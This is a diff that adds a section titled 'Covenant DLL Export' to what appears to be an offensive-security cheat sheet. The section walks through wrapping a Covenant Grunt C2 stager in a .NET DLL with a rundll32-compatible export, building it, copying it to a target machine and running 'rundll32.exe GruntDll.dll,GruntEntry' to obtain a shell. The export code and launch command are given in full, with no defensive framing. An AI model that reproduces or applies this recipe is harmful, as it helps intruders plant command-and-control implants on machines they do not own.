@@ -499,3 +499,39 @@ Just another way to declare modified strings
  
 
 
+### Covenant DLL Export
+
+From Covenant we can create a Grunt DLL that has an export compatible with rundll32. In Covenant, select the Binary Launcher and Generate a new Grunt. Then click the Code tab and copy the StagerCode.
+
+Open Visual Studio and create a new Class Library (.NET Framework) project. Delete everything in Class1.cs and paste the StagerCode.
+
+- Go to Project > Manage NuGet Packages. Click Browse and search for UnmanagedExports. Install the package by Robert Giesecke.
+
+- Collapse the GruntStager class and add the following Export class underneath.
+
+```cpp
+public class Exports
+{
+  [DllExport("GruntEntry", CallingConvention = CallingConvention.Cdecl)]
+  public static void GruntEntry(IntPtr hwnd,
+  IntPtr hinst,
+  string lpszCmdLine,
+  int nCmdShow)
+  {
+    new GruntStager();
+  }
+}
+
+```
+
+Add using statements for System.Runtime.InteropServices and RGiesecke.DllExport. 
+
+Open the Configuration Manager and create a New Solution Platform for x64 (and x86 if you require).
+
+Now build the proect then copy the DLL to the target machine and execute with rundll32 as follow
+
+```sh
+rundll32.exe GruntDll.dll,GruntEntry
+```
+
+Now you should have your shell
